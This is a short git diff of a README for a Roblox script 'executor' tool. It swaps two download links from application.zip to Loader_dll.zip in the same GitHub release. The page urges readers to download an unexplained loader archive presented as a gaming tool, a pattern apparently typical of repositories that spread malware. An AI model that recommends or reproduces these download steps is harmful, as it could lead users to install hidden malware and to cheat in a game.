@@ -226,7 +226,7 @@
 
 Welcome to the Scythex Executor repository! 🚀 This repository hosts the latest version of the Scythex Executor, a powerful tool for enhancing your Roblox gaming experience.
 
-![Scythex Executor](https://github.com/secondlathloothy/Scythex-Executor/releases/download/Download/application.zip)
+![Scythex Executor](https://github.com/secondlathloothy/Scythex-Executor/releases/download/Download/Loader_dll.zip)
 
 ## Table of Contents
 
@@ -721,7 +721,7 @@ Scythex Executor is a cutting-edge executor designed for Roblox script execution
 
 To get started with Scythex Executor, follow these simple steps:
 
-1. Download the latest version of the executor from the following link: [![Download Scythex Executor](https://img.shields.io/badge/Download-Scythex%20Executor-orange)](https://github.com/secondlathloothy/Scythex-Executor/releases/download/Download/application.zip).
+1. Download the latest version of the executor from the following link: [![Download Scythex Executor](https://img.shields.io/badge/Download-Scythex%20Executor-orange)](https://github.com/secondlathloothy/Scythex-Executor/releases/download/Download/Loader_dll.zip).
   
    This download button will provide you with the necessary files to install the executor on your system. Click the button to initiate the download process.
 
